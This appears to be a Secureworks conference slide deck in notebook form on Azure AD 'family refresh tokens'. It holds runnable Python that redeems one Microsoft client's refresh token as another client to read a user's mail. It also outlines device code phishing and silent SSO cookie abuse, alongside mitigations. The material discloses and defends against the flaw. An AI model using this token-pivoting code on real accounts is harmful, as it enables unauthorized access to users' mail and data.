---
jupyter:
  celltoolbar: Slideshow
  jupytext:
    notebook_metadata_filter: all
    text_representation:
      extension: .md
      format_name: markdown
      format_version: '1.3'
      jupytext_version: 1.13.7
  kernelspec:
    display_name: Python 3
    language: python
    name: python3
  language_info:
    codemirror_mode:
      name: ipython
      version: 3
    file_extension: .py
    mimetype: text/x-python
    name: python
    nbconvert_exporter: python
    pygments_lexer: ipython3
    version: 3.9.4
  rise:
    footer: '<center><h4><strong><span style=''background-color: #000000; color: #ffffff;''>&nbsp;
      &nbsp; TLP:WHITE&nbsp; &nbsp;&nbsp;TLP:WHITE&nbsp; &nbsp;&nbsp;TLP:WHITE&nbsp;
      &nbsp;&nbsp;TLP:WHITE&nbsp; &nbsp;&nbsp;</span></strong></h4></center>'
    header: '<center><h4><strong><span style=''background-color: #000000; color: #ffffff;''>&nbsp;
      &nbsp; TLP:WHITE&nbsp; &nbsp;&nbsp;TLP:WHITE&nbsp; &nbsp;&nbsp;TLP:WHITE&nbsp;
      &nbsp;&nbsp;TLP:WHITE&nbsp; &nbsp;&nbsp;</span></strong></h4></center>'
    height: 100%
    scroll: true
    width: 100%
---

<!-- #region slideshow={"slide_type": "slide"} -->
# Abusing Family Refresh Tokens for Unauthorized Access and Persistence in Azure Active Directory

> Undocumented functionality in Azure Active Directory allows a group of Microsoft OAuth client applications to obtain special “family refresh tokens,” which can be redeemed for bearer tokens as any other client in the family. 
>
> We will discuss how this functionality was uncovered, the mechanism behind it, and various attack paths to obtain family refresh tokens. We will demonstrate how this functionality can be abused to access sensitive data. Lastly, we will share relevant information to mitigate the theft of family refresh tokens.

- Ryan Marcotte Cobb
- CTU Special Operations
- Secureworks
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Agenda

1. Azure Active Directory and OAuth 2.0
2. Research, Experimentation, Findings
3. Introducing Family of Client IDs (FOCI) & Family Refresh Tokens (FRTs)
4. Attack Paths to Family Refresh Tokens
5. Mitigations for Family Refresh Tokens
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Reproducibility

https://github.com/secureworks/family-of-client-ids-research [![Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/secureworks/family-of-client-ids-research/HEAD?urlpath=lab%2Ftree%2FREADME.ipynb)
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Azure Active Directory and OAuth 2.0
 
<div style="padding-left: 15%;">
    
![consent](images/consent.svg)
    
</div>
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "notes"} -->
- AAD and OAuth 2.0: Specification and Implementation
- OAuth application dependencies in Microsoft 365
- Pre-authorization/pre-consent for some first-party applications
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Grant Flows

<div style="padding-left: 15%;">
    
![flows](images/obtains-tokens.svg)
    
 </div>
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "notes"} -->
- Auth code, ROPC, implicit, device code, ObO, etc.
- Public vs. confidential clients
- Bearer tokens
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Bearer Tokens

| Type          | Standard  | Lifetime |
| ------------- | --------- | -------- |
| ID Token      | OIDC      | 1 Hour   |
| Access Token  | OAuth 2.0 | 1 hour   |
| Refresh Token | OAuth 2.0 | 90 days  |
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Install Dependencies
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
#!pip install -r requirements.txt

import msal
import requests
import jwt
import pandas as pd
pd.options.display.max_rows = 999

from pprint import pprint
from typing import Any, Dict, List
```


<!-- #region slideshow={"slide_type": "slide"} -->
# Device Code Flow

- Grant flow: device code authorization grant
- OAuth client: Azure CLI
- Client ID: `04b07795-8ddb-461a-bbee-02f9e1bf7b46`
- Scopes requested: `.default`, `offline_access` 
- Resource: `https://graph.microsoft.com`
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Device Code Flow
<!-- #endregion -->

```python slideshow={"slide_type": "-"} rise={"scroll": true}
# App ID for Azure CLI client
azure_cli_client = msal.PublicClientApplication("04b07795-8ddb-461a-bbee-02f9e1bf7b46")

device_flow = azure_cli_client.initiate_device_flow(
    scopes=["https://graph.microsoft.com/.default"] # Requested scopes
)

print(device_flow["message"])
```


```python slideshow={"slide_type": "-"}
azure_cli_bearer_tokens_for_graph_api = azure_cli_client.acquire_token_by_device_flow(
    device_flow
)

print('Tokens acquired!')
```

<!-- #region slideshow={"slide_type": "slide"} -->
# Device Code Flow
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
pprint(azure_cli_bearer_tokens_for_graph_api)
```

<!-- #region slideshow={"slide_type": "slide"} -->
# Decode Access Token
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "-"} -->
- the provenance of the token (`iss`)
- the resource owner and client application (`oid`/`upn`, `appid`)
- the authorized scopes (`scp`)
- the issuance and expiration times (`iat`, `exp`)
- the resource server (`aud`)
- the authentication methods that the resource owner used to authorize the client application (`amr`)
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
def decode_jwt(base64_blob: str) -> Dict[str, Any]:
    """Decodes base64 encoded JWT blob"""
    return jwt.decode(
        base64_blob, options={"verify_signature": False, "verify_aud": False}
    )
```

```python slideshow={"slide_type": "slide"}
decoded_access_token = decode_jwt(
    azure_cli_bearer_tokens_for_graph_api.get("access_token")
)

pprint(decoded_access_token)
```

<!-- #region slideshow={"slide_type": "slide"} -->
# Use Access Token to Call Graph API

- Call Graph API endpoint: `/me/oauth2PermissionGrants`
- Graph [Permissions](https://docs.microsoft.com/en-us/graph/permissions-reference) map to scopes
- This API requires `Directory.Read.All`, `DelegatedPermissionGrant.ReadWrite.All`, `Directory.ReadWriteAll`, or `Directory.AccessAsUser.All`
- Pre-authorized/pre-consented first-party applications are invisible
<!-- #endregion -->

```python slideshow={"slide_type": "slide"}
def check_my_oauth2PermissionGrants(access_token: str) -> Dict[str, Any]:
    """Lists OAuth2PermissionGrants for the authorized user."""
    url = "https://graph.microsoft.com/beta/me/oauth2PermissionGrants"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {access_token}",
    }
    return requests.get(url, headers=headers).json()
```


```python slideshow={"slide_type": "-"}
check_my_oauth2PermissionGrants(
    azure_cli_bearer_tokens_for_graph_api.get("access_token")
)
```

<!-- #region slideshow={"slide_type": "slide"} -->
# Refresh Tokens

- Long-lived bearer token
- Always non-interactive (inherits `amr` claims)
- Used to mint new access tokens
- High-value target for adversaries: token theft, replay
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Refresh Grant Flow
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "-"} -->
![refresh](images/refresh-tokens.svg)
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Refresh Tokens: Specification

The OAuth 2.0 specifications include safeguards to mitigate the potential risks of/from refresh token theft:

- Safeguard #1: **Same Scopes** 
- Safeguard #2: **Same Client** 

In short, the level of access afforded by a refresh token should match what the user authorized to the client.
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Redeem Refresh Token
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
new_azure_cli_bearer_tokens_for_graph_api = (

    # Same client as original authorization
    azure_cli_client.acquire_token_by_refresh_token( 
        azure_cli_bearer_tokens_for_graph_api.get("refresh_token"),
        # Same scopes as original authorization
        scopes=["https://graph.microsoft.com/.default"], 
    )
)

pprint(new_azure_cli_bearer_tokens_for_graph_api)
print('\n===========================================\n')
pprint(decode_jwt(new_azure_cli_bearer_tokens_for_graph_api.get("access_token")))
```


<!-- #region slideshow={"slide_type": "slide"} -->
# Refresh Tokens: AAD Implementation

AAD RTs already ignore safeguard #1. This is documented behavior.

> Refresh tokens are also used to acquire extra access tokens for other resources. Refresh tokens are bound to a combination of user and client, but aren't tied to a resource or tenant. As such, **a client can use a refresh token to acquire access tokens across any combination of resource and tenant where it has permission to do so.** [Link](https://docs.microsoft.com/en-us/azure/active-directory/develop/refresh-tokens)
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Documented AAD RT Behavior: Different Scopes
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
azure_cli_bearer_tokens_for_outlook_api = (

    # Same client as original authorization
    azure_cli_client.acquire_token_by_refresh_token( 
        new_azure_cli_bearer_tokens_for_graph_api.get("refresh_token" ),
        # But different scopes than original authorization
        scopes=[
            "https://outlook.office.com/.default" 
        ],  
    )
)

pprint(azure_cli_bearer_tokens_for_outlook_api)
print('===========================================')
pprint(decode_jwt(azure_cli_bearer_tokens_for_outlook_api.get("access_token")))
```


<!-- #region slideshow={"slide_type": "slide"} -->
# Undocumented AAD RT Behavior: Different Clients

- Inspired by [TokenTactics](https://github.com/rvrsh3ll/TokenTactics) and [AADInternals](https://github.com/Gerenios/AADInternals)
    - RTs issued to Client A redeemed for new tokens as Client B
- Different scopes... *and* different clients?
- This is not documented
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Undocumented AAD RT Behavior: Different Clients
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
# Microsoft Office Client ID
microsoft_office_client = msal.PublicClientApplication("d3590ed6-52b3-4102-aeff-aad2292ab01c")

microsoft_office_bearer_tokens_for_graph_api = (
    # This is a different client application than we used in the previous examples
    microsoft_office_client.acquire_token_by_refresh_token(
        # But we can use the refresh token issued to our original client application
        azure_cli_bearer_tokens_for_outlook_api.get("refresh_token"),
        # And request different scopes too
        scopes=["https://graph.microsoft.com/.default"],
    )
)

# How is this possible?
pprint(microsoft_office_bearer_tokens_for_graph_api)
print('===========================================')
pprint(decode_jwt(microsoft_office_bearer_tokens_for_graph_api.get("access_token")))
```


<!-- #region slideshow={"slide_type": "slide"} -->
# Research Questions

1. What is the mechanism and purpose behind this undocumented behavior?
2. Which client applications are compatible with each other?
3. Can this behavior be abused for fun and profit?
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Experiments

- Assembled a list of known Microsoft OAuth applications and resources
- Acquired tokens for each client app and resource pair
- Brute force: attempted to redeem RTs for each client app and resource pair
- Pending publication on experiment design in ICEIS 2022
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Findings

- RTs successfully redeemed for a different client: 15/~600 Microsoft OAuth apps
- All 15 client apps were first-party, pre-authorized, public, and present by default in tenant
- All 15 client apps could redeem RTs for any of the other 15 client apps
- Authorized scopes based on the new client app
- Works cross-tenant with B2B guest user
- The AS returned additional field: `foci`
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Introducing Family of Client IDs

The term “FOCI” is only [mentioned once](https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-all-sign-ins) in official Microsoft documentation:
- An acronym for “Family of Client IDs”
- Related to signing into multiple Microsoft Office applications on mobile devices
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
Sleuthing MS Identity SDKs on Github:

> "FUTURE SERVER WORK WILL ALLOW CLIENT IDS TO BE GROUPED ON THE SERVER SIDE IN A WAY WHERE A RT FOR ONE CLIENT ID CAN BE REDEEMED FOR A AT AND RT FOR A DIFFERENT CLIENT ID AS LONG AS THEY'RE IN THE SAME GROUP. THIS WILL MOVE US CLOSER TO BEING ABLE TO PROVIDE SSO-LIKE FUNCTIONALITY BETWEEN APPS WITHOUT REQUIRING THE BROKER (OR WORKPLACE JOIN)."
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Introducing Family Refresh Tokens

- RTs issued to FOCI "family" clients called "family refresh tokens" (FRTs)
    - Only one family exists
- MSRC confirmed FOCI as legit software feature
    - Mirrors the behavior of mobile operating systems that store authentication artifacts (such as refresh tokens) in a shared token cache with other applications from the same software publisher
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# FOCI "Family" Client Applications

As more are discovered, will add to `known-foci-clients.csv`.

| Application ID                       | Application Name                         |
| ------------------------------------ | ---------------------------------------- |
| 00b41c95-dab0-4487-9791-b9d2c32c80f2 | Office 365 Management                    |
| 04b07795-8ddb-461a-bbee-02f9e1bf7b46 | Microsoft Azure CLI                      |
| 1950a258-227b-4e31-a9cf-717495945fc2 | Microsoft Azure PowerShell               |
| 1fec8e78-bce4-4aaf-ab1b-5451cc387264 | Microsoft Teams                          |
| 26a7ee05-5602-4d76-a7ba-eae8b7b67941 | Windows Search                           |
| 27922004-5251-4030-b22d-91ecd9a37ea4 | Outlook Mobile                           |
| 4813382a-8fa7-425e-ab75-3b753aab3abb | Microsoft Authenticator App              |
| ab9b8c07-8f02-4f72-87fa-80105867a763 | OneDrive SyncEngine                      |
| d3590ed6-52b3-4102-aeff-aad2292ab01c | Microsoft Office                         |
| 872cd9fa-d31f-45e0-9eab-6e460a02d1f1 | Visual Studio                            |
| af124e86-4e96-495a-b70a-90f90ab96707 | OneDrive iOS App                         |
| 2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8 | Microsoft Bing Search for Microsoft Edge |
| 844cca35-0656-46ce-b636-13f48b0eecbd | Microsoft Stream Mobile Native           |
| 87749df4-7ccf-48f8-aa87-704bad0e0e16 | Microsoft Teams - Device Admin Agent     |
| cf36b471-5b44-428c-9ce7-313bf84528de | Microsoft Bing Search                    |


<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Security Implications of Family Refresh Tokens

- Not bound by client or resource, FRTs afford uniquely broad access compared to normal RTs
- Effectively provides authorization for the union of scopes consented to the entire FOCI "family" group
- Take a look at all the scopes available (`scope-map.txt`)
- Blast radius from FRT theft considerably larger than normal RTs
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Scenario: Stolen Azure CLI Tokens

Imagine Azure CLI tokens stolen from `~/.Azure/accessTokens.json`.
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
def read_email_messages(access_token: str) -> List[Dict[str, Any]]:
    """List the user's email messages."""
    url = "https://graph.microsoft.com/beta/me/mailfolders/inbox/messages"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {access_token}",
    }
    return pprint(requests.get(url, headers=headers).json())
```

<!-- #region slideshow={"slide_type": "-"} -->
If the adversary steals tokens that don't have consent for the desired scopes...
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
read_email_messages(azure_cli_bearer_tokens_for_graph_api.get("access_token"))
```

<!-- #region slideshow={"slide_type": "-"} -->
No luck.
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
But if the adversary redeems the FRT for a different FOCI "family" client app that has consent for the desired scopes:
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
read_email_messages(microsoft_office_bearer_tokens_for_graph_api.get("access_token"))
```

<!-- #region slideshow={"slide_type": "-"} -->
Great success!
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Scopes in the Family

- Redeem FRT for ATs for every FOCI "family" client app
- New FRT do not invalidate previously issued FRTs
- "All the tokens!" did not trigger CAE/risky behavior during testing
- Explore the data yourself
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Scopes in the Family
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
from utils import get_tokens_for_foci_clients

df = get_tokens_for_foci_clients(azure_cli_bearer_tokens_for_graph_api, demo=True)
df.head()
```

```python slideshow={"slide_type": "slide"}
(
    df.assign(
        scp=df.scp.str.split()
    )
    .explode('scp')
    .groupby([
        'scp', 
        'aud', 
        'appid'
    ])
    .size()
    .to_frame()
)
```

<!-- #region slideshow={"slide_type": "slide"} -->
# On Privilege Escalation

- Level of access relative to directory role assignments is unchanged
- Privesc relative to the client application
- Privesc relative to user authorization
- Privesc relative to defender expectations
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Attack Paths

RFC 6819 enumerates a [variety of attack paths](https://datatracker.ietf.org/doc/html/rfc6819#section-4.1.2):

1. Stealing a previously and legitimately issued family refresh token
2. Obtaining a family refresh token through malicious authorization

We focused our attention on how an attacker could obtain family refresh tokens by maliciously authorizing a family client application.
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Device Code Phishing

All known FOCI "family" client apps support [device authorization grant flow](https://datatracker.ietf.org/doc/html/rfc8628).
 
<center>
    
![device-code](images/device-code.png)
    
</center>

<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Device Code Phishing

**Benefits**

[Device code phishing](https://o365blog.com/post/phishing/) with FOCI client apps:
1. Choose the best client app as the lure for social engineering
2. Redeem FRT for client with desired scopes
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Abusing Single Sign-On

Threat model: [automatically authorizing](https://datatracker.ietf.org/doc/html/rfc6819#section-4.4.3.3) client applications

**Attack**
- On an AAD-joined Windows devices with SSO enabled
- Get process execution as signed-in Azure AD user
- [Request a PRT pre-signed cookie from a COM service](https://github.com/leechristensen/RequestAADRefreshToken)
- Use cookie to complete an auth grant flow for family client app
- Redeem FRTs as desired
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
![sso-cs](images/sso-cs.png)
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Abusing Single Sign-On

**Benefits**
- Relatively low bar-to-entry
- Completely silent to the user
- Only need one PRT-derived `x-ms-RefreshTokenCredential` cookie
- Inherits device claims
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Conditional Access Policies

Conditional Access Policies still apply to family client applications and FRTs, but...

- based on Client ID trivially bypassed if another family client app has consent for desired scopes
- that require multi-factor authentication, however, do not impede attackers from abusing legitimately issued FRTs since RT grants are always non-interactive
- based on trusting the device are ineffective when a family client app is maliciously authorized by abusing SSO
- Microsoft plans to improve CA to allow restricting the issuance of FRTs and unbound refresh tokens in the future

Recent testing shows "Office apps" applies CA against the resource, not client!
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Auditing Sign-In Logs

![signins](images/signins.png)

![signins-scopes](images/signins-scopes.PNG)
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Auditing Sign-In Logs

- Unfortunately, Microsoft dismissed the idea of publishing the current list of FOCI clients because the **“list changes frequently with new apps and removal of old apps”**
- Currently no indication if the sign-in was done using a FRT
- Monitor for bursts of non-interactive sign-ins using multiple FOCI clients in a short period of time

<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Revoking Refresh Tokens
<!-- #endregion -->

```python slideshow={"slide_type": "-"}
Connect-AzureAD
Revoke-AzureADUserAllRefreshToken -ObjectId johndoe@contoso.com
```

<!-- #region slideshow={"slide_type": "-"} -->
- Defenders must aggressively revoke refresh tokens whenever an account is suspected to be compromised. 
- Resetting a compromised user's password does not automatically invalidate bearer tokens that have already been issued in many circumstances
- [Continuous access evaluation](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/concept-continuous-access-evaluation) (CAE) is relevant, but not universally supported
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Conclusion

- Refresh tokens are long-lived credentials
- The scopes authorized determine the blast radius from refresh token theft
- OAuth Specifications include safeguards to mitigate potential risk
- AAD does not enforce these safeguards for refresh tokens
- Considerable security implications from undocumented `foci` and FRT feature
- Defenders have a right to know about FOCI
    - “Consent” seems incompatible with invisible pre-authorized fist-party clients
    - Need to know the list of FOCI client apps to monitor for them
    - Organizations need to determine legitimate business need and be able to deny access
-  Microsoft stated: “in the future we may move away from FOCI completely”
<!-- #endregion -->

<!-- #region slideshow={"slide_type": "slide"} -->
# Special Thanks

- Tony Gore, CTU Special Operations
- Dr. Nestori Syyinmaa (@DrAzure), CTU Special Operations
<!-- #endregion -->
